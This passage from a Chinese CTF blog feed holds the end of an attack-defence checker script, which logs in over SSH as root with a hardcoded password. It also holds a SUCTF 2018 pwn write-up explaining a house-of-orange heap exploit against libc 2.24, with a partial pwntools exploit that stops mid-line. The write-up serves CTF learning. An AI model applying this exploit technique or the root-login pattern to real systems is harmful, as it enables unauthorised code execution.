class="string">'\n'</span>, <span class="string">'red'</span>),ip=oip)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>        </span><br><span class="line"><span class="comment"># init 0x29D6 0x2AB6</span></span><br><span class="line">    f.seek(<span class="number">0x29D6</span>,<span class="number">0</span>)</span><br><span class="line">    f_standard.seek(<span class="number">0x29D6</span>,<span class="number">0</span>)</span><br><span class="line">    standard_tmp = f_standard.read(<span class="number">0x2AB6</span><span class="number">-0x29D6</span>)</span><br><span class="line">    md5obj = hashlib.md5()</span><br><span class="line">    tmp = f.read(<span class="number">0x2AB6</span><span class="number">-0x29D6</span>)</span><br><span class="line">    md5obj.update(tmp)</span><br><span class="line">    hash_tmp = md5obj.hexdigest()</span><br><span class="line">    md5obj = hashlib.md5()</span><br><span class="line">    <span class="comment">#tmp = f.read(0x28f0-0x1273)</span></span><br><span class="line">    md5obj.update(standard_tmp)</span><br><span class="line">    hash_standard = md5obj.hexdigest()    </span><br><span class="line">    <span class="keyword">if</span> (hash_tmp!=hash_standard):</span><br><span class="line">        f.close()</span><br><span class="line">        print_log(colored(<span class="string">'[Error] in patch init : '</span> + oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=oip)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>   </span><br><span class="line"><span class="comment"># menu 0x2AB7 0x2b03</span></span><br><span class="line">    f.seek(<span class="number">0x2AB7</span>,<span class="number">0</span>)</span><br><span class="line">    f_standard.seek(<span class="number">0x2AB7</span>,<span class="number">0</span>)</span><br><span class="line">    standard_tmp = f_standard.read(<span class="number">0x2b03</span><span class="number">-0x2AB7</span>)</span><br><span class="line">    md5obj = hashlib.md5()</span><br><span class="line">    tmp = f.read(<span class="number">0x2b03</span><span class="number">-0x2AB7</span>)</span><br><span class="line">    md5obj.update(tmp)</span><br><span class="line">    hash_tmp = md5obj.hexdigest()</span><br><span class="line">    md5obj = hashlib.md5()</span><br><span class="line">    <span class="comment">#tmp = f.read(0x28f0-0x1273)</span></span><br><span class="line">    md5obj.update(standard_tmp)</span><br><span class="line">    hash_standard = md5obj.hexdigest()    </span><br><span class="line">    <span class="keyword">if</span> (hash_tmp!=hash_standard):</span><br><span class="line">        f.close()</span><br><span class="line">        print_log(colored(<span class="string">'[Error] in patch menu : '</span> + oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=oip)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    f.seek(<span class="number">0x4412</span>,<span class="number">0</span>)</span><br><span class="line">    flag_str =f.read(<span class="number">22</span>)</span><br><span class="line">    <span class="comment">#print flag_str</span></span><br><span class="line">    <span class="keyword">if</span> flag_str !=<span class="string">'/home/tsctf/flag/flag\0'</span>:</span><br><span class="line">        f.close()</span><br><span class="line">        print_log(colored(<span class="string">'[Error] in game-&gt;patch flag path : '</span> + oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=oip)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    f.seek(<span class="number">0x1273</span>,<span class="number">0</span>)</span><br><span class="line">    f_standard.seek(<span class="number">0x1273</span>,<span class="number">0</span>)</span><br><span class="line">    standard_tmp = f_standard.read(<span class="number">0x28f0</span><span class="number">-0x1273</span>)</span><br><span class="line">    md5obj = hashlib.md5()</span><br><span class="line">    tmp = f.read(<span class="number">0x28f0</span><span class="number">-0x1273</span>)</span><br><span class="line">    md5obj.update(tmp)</span><br><span class="line">    hash_tmp = md5obj.hexdigest()</span><br><span class="line">    md5obj = hashlib.md5()</span><br><span class="line">    <span class="comment">#tmp = f.read(0x28f0-0x1273)</span></span><br><span class="line">    md5obj.update(standard_tmp)</span><br><span class="line">    hash_standard = md5obj.hexdigest()    </span><br><span class="line">    <span class="keyword">if</span> (hash_tmp!=hash_standard):</span><br><span class="line">        f.close()</span><br><span class="line">        print_log(colored(<span class="string">'[Error] in game-&gt;patch game code : '</span> + oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=oip)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>        </span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_thread</span><span class="params">(round)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    function: cheinvalid literal for int() with base 10:ck every targeted ip</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    port = <span class="number">40111</span><span class="comment">#1022</span></span><br><span class="line">    ipbase = <span class="string">'172.16.20.'</span></span><br><span class="line">    team_num = <span class="number">17</span></span><br><span class="line"></span><br><span class="line">    check_result = []</span><br><span class="line"></span><br><span class="line">    <span class="comment"># if not debug:</span></span><br><span class="line">    <span class="comment">#    time.sleep(random.randint(10, 20))</span></span><br><span class="line"></span><br><span class="line">    print_log(</span><br><span class="line">        colored(<span class="string">'================= Round %d =================='</span> % round, <span class="string">"green"</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, team_num+<span class="number">1</span>):</span><br><span class="line">        ip = ipbase + str(i)</span><br><span class="line">        print_log(<span class="string">'check ip: '</span> + ip)</span><br><span class="line">        check_count = <span class="number">0</span></span><br><span class="line">        file_check  = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">            <span class="string">"""</span></span><br><span class="line"><span class="string">            check 5 times for every ip, </span></span><br><span class="line"><span class="string">            if check fail more than three times, then check result is down</span></span><br><span class="line"><span class="string">            """</span></span><br><span class="line">            <span class="comment">#ip = "127.0.0.1"</span></span><br><span class="line">            <span class="comment">#port = 2111</span></span><br><span class="line">            single_check = check(ip, port)</span><br><span class="line">            <span class="keyword">if</span> single_check == <span class="number">0</span>:</span><br><span class="line">                print_log(<span class="string">"[check %d] address: %s result: successful"</span> %</span><br><span class="line">                          (i + <span class="number">1</span>, ip))</span><br><span class="line">            <span class="keyword">elif</span> single_check == <span class="number">1</span>:</span><br><span class="line">                check_count += <span class="number">1</span></span><br><span class="line">                print_log(<span class="string">"[check %d] address: %s result: failed"</span> %</span><br><span class="line">                          (i + <span class="number">1</span>, ip))</span><br><span class="line">        <span class="comment"># check shell</span></span><br><span class="line">        <span class="comment"># to determine whether a team uses common guard</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ssh_shell = ssh(host=ip, port = <span class="number">1022</span>,user=<span class="string">'root'</span>, password=<span class="string">'GA7E12EH2C3CFEBBD1G4'</span>,cache=<span class="keyword">False</span>)</span><br><span class="line">            ssh_shell.download(file_path,<span class="string">'./file/'</span>+ip+<span class="string">'.bin'</span>)</span><br><span class="line">            ssh_shell.close()</span><br><span class="line">            <span class="comment">#print os.path.getsize('pwn1')</span></span><br><span class="line">            <span class="comment">#print CalcMD5("DNS_Server_standard")</span></span><br><span class="line">            <span class="comment">#print CalcMD5('./file/'+ip+'.bin')</span></span><br><span class="line">            <span class="keyword">if</span> (CalcMD5(<span class="string">"DNS_Server_standard"</span>)!= CalcMD5(<span class="string">'./file/'</span>+ip+<span class="string">'.bin'</span>)):</span><br><span class="line">                <span class="keyword">if</span> abs(os.path.getsize(<span class="string">'DNS_Server_standard'</span>) - os.path.getsize(<span class="string">'./file/'</span>+ip+<span class="string">'.bin'</span>)) &gt; <span class="number">128</span>:</span><br><span class="line">                    print_log(colored(<span class="string">'[Warning] find doubtful patch : '</span> + ip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=ip)</span><br><span class="line">                <span class="keyword">if</span>(coding_check_level):</span><br><span class="line">                    file_check = patch_check(<span class="string">'./file/'</span>+ip+<span class="string">'.bin'</span>,<span class="string">"DNS_Server_standard"</span>,ip)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print_log(</span><br><span class="line">                        colored(<span class="string">'[info] file size check ok: '</span> + ip + <span class="string">'\n'</span>, <span class="string">'green'</span>))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print_log(str(e))</span><br><span class="line">            print_log(</span><br><span class="line">                colored(<span class="string">'[Error] cannnot connect %s by ssh'</span> % ip, <span class="string">"yellow"</span>))</span><br><span class="line">    <span class="comment"># upload check result into server</span></span><br><span class="line">        <span class="keyword">if</span>(file_check==<span class="number">1</span>):</span><br><span class="line">            print_log(<span class="string">"[patch_check] address: %s result: successful"</span> %(ip))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print_log(<span class="string">"[patch_check] address: %s result: failed"</span> %(ip))    </span><br><span class="line">        print_log(<span class="string">""</span>)   </span><br><span class="line">        <span class="keyword">print</span> check_count,file_check</span><br><span class="line">        <span class="keyword">if</span> ((check_count &gt;= <span class="number">2</span>) | (file_check == <span class="number">0</span>)):</span><br><span class="line">            check_result.append(&#123;<span class="string">'tid'</span>:ip.split(<span class="string">'.'</span>)[<span class="number">-1</span>],<span class="string">'qid'</span>: <span class="string">'3'</span>, <span class="string">'state'</span>: <span class="number">2</span>&#125;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            check_result.append(&#123;<span class="string">'tid'</span>:ip.split(<span class="string">'.'</span>)[<span class="number">-1</span>],<span class="string">'qid'</span>: <span class="string">'3'</span>, <span class="string">'state'</span>: <span class="number">0</span>&#125;)   </span><br><span class="line">        <span class="comment">#print check_result</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#print json.dumps(check_result)</span></span><br><span class="line">        upload(<span class="string">"http://172.16.123.123/commapi/script/setServiceState"</span>,</span><br><span class="line">               &#123;<span class="string">'result'</span>: json.dumps(check_result)&#125;)</span><br><span class="line">        <span class="comment">#print json.dumps(check_result)</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print_log(<span class="string">'[HttpError] cannot connect to http server'</span>)</span><br><span class="line">    print_log(str(check_result))</span><br><span class="line">    print_log(<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_test</span><span class="params">()</span>:</span></span><br><span class="line">    port = <span class="number">2111</span></span><br><span class="line">    ipbase = <span class="string">'172.16.10.'</span></span><br><span class="line">    <span class="comment">#ip = '10.210.103.168'</span></span><br><span class="line">    check_result = []</span><br><span class="line">    check_count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        single_check = check(ip, port)</span><br><span class="line">        <span class="keyword">if</span> single_check == <span class="number">0</span>:</span><br><span class="line">            print_log(<span class="string">"[check %d] address: %s result: successful"</span> %</span><br><span class="line">                      (i + <span class="number">1</span>, ip))</span><br><span class="line">        <span class="keyword">elif</span> single_check == <span class="number">1</span>:</span><br><span class="line">            check_count += <span class="number">1</span></span><br><span class="line">            print_log(<span class="string">"[check %d] address: %s result: failed"</span> %</span><br><span class="line">                      (i + <span class="number">1</span>, ip))</span><br><span class="line">    print_log(<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">if</span> check_count &gt;= <span class="number">3</span>:</span><br><span class="line">        check_result.append(&#123;<span class="string">'ip'</span>: <span class="string">'172.16.20.3'</span>, <span class="string">'state'</span>: <span class="number">1</span>&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        check_result.append(&#123;<span class="string">'ip'</span>: <span class="string">'172.16.20.3'</span>, <span class="string">'state'</span>: <span class="number">0</span>&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># check shell</span></span><br><span class="line">        <span class="comment"># to determine whether a team uses common guard</span></span><br><span class="line">    <span class="comment"># upload check result into server</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        upload(<span class="string">"http://172.16.123.123/check_the_player.php"</span>,</span><br><span class="line">               &#123;<span class="string">'result'</span>: json.dumps(check_result)&#125;)</span><br><span class="line">        <span class="keyword">print</span> json.dumps(check_result)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print_log(<span class="string">'[HttpError] cannot connect to http server'</span>)</span><br><span class="line">    print_log(str(check_result))</span><br><span class="line">    print_log(<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    round = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">'./checkresult/'</span>):</span><br><span class="line">        os.makedirs(<span class="string">'./checkresult/'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">'./file/'</span>):</span><br><span class="line">        os.makedirs(<span class="string">'./file/'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        thread.start_new_thread(check_thread, (round, ))</span><br><span class="line">        time.sleep(round_time)  <span class="comment"># five minutes</span></span><br><span class="line">        round += <span class="number">1</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">1. patch heap</span></span><br><span class="line"><span class="string">2. login? 1.2.</span></span><br><span class="line"><span class="string">3. serach</span></span><br><span class="line"><span class="string">4. delete single</span></span><br><span class="line"><span class="string">5. </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h2 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h2><p>线下赛的时候在Checker机制中也发现了许多问题，对于通防的思路还是太窄，好在刚开始比赛的时候用size大小的方法+手工的方法查到了NeSE战队的通防，威逼利诱的情况下后来比赛中没有出现其他通防。</p>]]></content>
    
    <summary type="html">
    
      最近在胖哈勃的月赛和TSCTF2018 FINAL两场比赛担任了出题人的任务，在出题的过程中也学到了很多东西，分享一下题目的题解和相关的知识。
    
    </summary>
    
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>SUCTF 2018部分PWN题复现</title>
    <link href="http://p4nda.top/2018/05/29/suctf2018/"/>
    <id>http://p4nda.top/2018/05/29/suctf2018/</id>
    <published>2018-05-29T12:42:46.000Z</published>
    <updated>2018-07-05T13:41:46.520Z</updated>
    
    <content type="html"><![CDATA[<p>写论文已经两周了orz，今天终于写完了… SUCTF完全靠大佬们带飞，躺进XCTF联赛决赛圈了..</p><p><img src="/img/SUCTF2018/0.png" alt=""></p><h1 id="note"><a href="#note" class="headerlink" title="note"></a>note</h1><p>note这题也是被大佬们秒的比较多的题目了，我个人觉得这次PWN出的还是挺好的。</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目有添加、显示、潘多拉魔盒（？）函数：</p><p>add：</p><p><img src="/img/SUCTF2018/1-1.png" alt=""></p><p>show:</p><p><img src="/img/SUCTF2018/1-2.png" alt=""></p><p>pandora box:</p><p><img src="/img/SUCTF2018/1-3.png" alt=""></p><p>可以看出add函数最多可以申请10次（用处不大？），起初初始化程序时申请了两个连续的0x88的块，在pandora box函数中释放，程序不存在修改操作。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>漏洞十分明显，在add函数中，对申请堆块的输入使用scanf(“%s”,(&amp;ptr)[i]，显然存在一个堆溢出漏洞，并且对堆块也没有释放操作。看上去让人容易联想起House of orange，其实也是（…）</p><p>题目给的库是libc 2.24的，也就是说必须使用_IO_str_jump的方法利用了。</p><p>简单的House of orange我曾经发过一篇原理在看雪论坛上，一起食用风味更佳：<a href="https://bbs.pediy.com/thread-223334.htm" target="_blank" rel="noopener">从BookWriter看house_of_orange原理【新手向】</a></p><p>具体house of orange的手法是用unsorted bin attack将_IO_list_all覆写成unsorted bin 头节点（libc bss段上的main_arena + 88），此时在出错时最终会调用_IO_flush_all函数，具体是程序会从_IO_list_all中取出保存的_IO_FILE_plus指针以虚表的形式调用_IO_flush_all函数。可攻击的点在于_IO_list_all是一个文件指针单链表，当一个指针不满足时会继续执行下一个指针，可以将指针控制到我们可以控制的堆块中（通过修改size），最终伪造_IO_FILE_plus指针内容，劫持控制流。</p><p>在libc 2.24中，增加的对_IO_FILE_plus中的虚表进行检查，不允许将虚表指向意外的地方：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *</span></span><br><span class="line"><span class="class"><span class="title">IO_validate_vtable</span> (<span class="title">const</span> <span class="title">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *ptr = (<span class="keyword">const</span> <span class="keyword">char</span> *) vtable;</span><br><span class="line">  <span class="keyword">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这时，大佬们考虑将虚表指向一个libc已存在的虚表，这样可以绕过检查了，由于虚表里指针调用的函数偏移不同，将虚表劫持后，会执行另一个虚表的其他函数，这个虚表被劫持为_IO_str_jumps，当执行想_IO_flush_all，实际上执行了_IO_str_overflow函数，在这个函数中当可以绕过一些判断时，可以执行一个新的函数， new_buf = (char <em>) (</em>((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size); 这个函数同样是相对调用调用，fp时我们可以控制的内存，其内存参数可以通过size计算得到。</p><p>可以看到需要满足的条件时：</p><ol><li>pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only)</li></ol><ol><li>new_size &lt; old_blen</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_str_overflow (_IO_FILE *fp, <span class="keyword">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> flush_only = c == EOF;</span><br><span class="line">  _IO_size_t pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line"><span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> *new_buf;</span><br><span class="line">  <span class="keyword">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">  <span class="keyword">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">  _IO_size_t new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  new_buf</span><br><span class="line">    = (<span class="keyword">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</span><br><span class="line">  <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/*  __ferror(fp) = 1; */</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (old_buf)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">      (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);</span><br><span class="line">      <span class="comment">/* Make sure _IO_setb won't try to delete _IO_buf_base. */</span></span><br><span class="line">      fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">'\0'</span>, new_size - old_blen);</span><br><span class="line"></span><br><span class="line">  _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">  fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">  fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">  fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">  fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">  fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="keyword">unsigned</span> <span class="keyword">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span></span><br></pre></td></tr></table></figure><p>参考<a href="http://simp1e.leanote.com/post/Hctf-2017-babyprintf" target="_blank" rel="noopener">simp1e师傅之前关于Hctf-babyprintf题目的利用</a> ， 可以对参数进行构造：</p><p>2 * old_blen + 100 = addr of “/bin/sh”</p><p>old_blen = (fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base</p><p>构造 (fp)-&gt;_IO_buf_end =（ addr of “/bin/sh” - 100） /2</p><p>(fp)-&gt;_IO_buf_base = 0 即可</p><p>至于如何构造unsorted bin attack可以通过申请堆块，释放原有的堆块，申请小堆块，溢出写来得到，具体exp如下：</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#SUCTF&#123;Me1z1jiu_say_s0rry_LOL&#125;</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = process(<span class="string">'./note'</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">libc = ELF(<span class="string">'./libc6_2.24-12ubuntu1_amd64.so'</span>)</span><br><span class="line">p = remote(<span class="string">'pwn.suctf.asuri.org'</span>,<span class="number">20003</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Welcome Homura Note Book!   '</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Choice&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">'Content:'</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Choice&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Choice&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'(yes:1)'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">16</span>,<span class="string">'1'</span>*<span class="number">16</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak system address</span></span><br><span class="line">dele()</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Content:'</span>)</span><br><span class="line">libc_addr = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line">offset =  <span class="number">0x7f1b15e2ab78</span><span class="number">-0x7f1b15a66000</span></span><br><span class="line">libc_base = libc_addr - <span 